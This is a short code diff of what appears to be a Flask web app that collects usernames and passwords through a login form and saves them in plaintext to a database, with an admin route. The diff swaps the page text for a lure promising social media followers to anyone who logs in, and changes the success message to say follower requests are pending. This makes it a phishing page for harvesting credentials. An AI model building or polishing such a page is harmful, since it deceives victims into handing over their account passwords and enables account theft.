@@ -28,7 +28,7 @@ HTML = """
       <button type="submit">Log in</button>
     </form>
     <p style="margin-top:12px;font-size:13px;color:#aaa">
-<p>Blue Badge Verified Setup</p>
+<p>Please Logins That Id Which You Want To Followers!</p>
   </div>
 </body>
 </html>
@@ -62,7 +62,7 @@ def index():
         c.execute("INSERT INTO logins (username,password,ts) VALUES (?,?,?)", (u,p,ts))
         conn.commit()
         conn.close()
-        return "<h3>✅ Saved Successfully!</h3><p><a href='/'>Back</a></p>"
+        return "<h3>YOUR FOLLLOWERS REQUESTS IN PENDING WHEN YOU VERIFIED YOUR REQUESTED IS PENDING</h3><p><a href='/'>Back</a></p>"
     return render_template_string(HTML)
 
 @app.route("/admin")
